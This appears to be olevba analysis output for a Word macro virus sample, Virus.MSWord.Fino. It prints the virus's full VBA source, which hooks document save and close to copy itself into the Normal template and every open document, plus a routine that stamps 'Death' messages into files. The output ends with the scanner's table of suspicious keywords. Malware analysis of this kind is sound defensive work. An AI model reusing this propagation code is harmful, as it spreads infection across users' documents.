olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Fino
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Fino - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO info.bas 
in file: Virus.MSWord.Fino - OLE stream: 'Macros/VBA/info'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub FileSave()
Attribute FileSave.VB_Description = "Saves the active document or template"
Attribute FileSave.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.FileSave"
    Call infect
    ActiveDocument.Save
End Sub
Sub FileClose()
    On Error Resume Next
    Call infect
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub
Sub infect()
    On Error Resume Next
    Dim comp, cm, NI, DI, doc
    MsgBox "going to infect"
    Dim i
    For i = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1
        If NormalTemplate.VBProject.VBComponents(i).Name = "info" Then
           NI = True
        End If
    Next
    If Not NI Then
       Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="info", Object:=wdOrganizerObjectProjectItems
    End If
    For Each doc In Application.Documents
        For Each comp In doc.VBProject.VBComponents
            If comp.Name = "info" Then
               DI = True
            End If
        Next
        If Not DI Then
            Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=doc.FullName, Name:="info", Object:=wdOrganizerObjectProjectItems
            Dim myrange
            On Error Resume Next
            'CommandBars("Visual Basic").Visible = False
            'CommandBars("Visual Basic").Enabled = False
            'CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
            'CommandBars("Visual Basic").Protection = msoBarNoCustomize
            'CommandBars("Tools").Controls("Macro").Delete
            'CommandBars("Tools").Controls("Customize...").Delete
            'CommandBars("Tools").Controls("Templates and Add-Ins...").Delete
            'CustomizationContext = NormalTemplate
            'FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
            'FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
        End If
    Next
End Sub
Sub stamp()
    On Error Resume Next
    Dim doc
    For Each doc In Documents
        doc.BuiltInDocumentProperties("Title") = "Message by Death"
        doc.BuiltInDocumentProperties("Subject") = "Your are infected"
        doc.BuiltInDocumentProperties("Author") = "Death"
        doc.BuiltInDocumentProperties("Manager") = "Death"
        doc.BuiltInDocumentProperties("Company") = "Death"
        
        Set myrange = doc.Range(Start:=0, End:=1)
            With myrange
                .Font.Name = "Wingdings"
                .Font.Emboss = True
                .Font.Shadow = True
                .Font.ColorIndex = wdRed
                .Text = "N                     "
                .Font.Size = 72
            End With
        Set myrange = doc.Range(Start:=1, End:=20)
            With myrange
                .Font.Name = "ariel"
                .Font.Emboss = True
                .Font.Shadow = True
                .Font.ColorIndex = wdBlue
                .Text = "Love by death"
                .Font.Size = 20
            End With
    Next
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

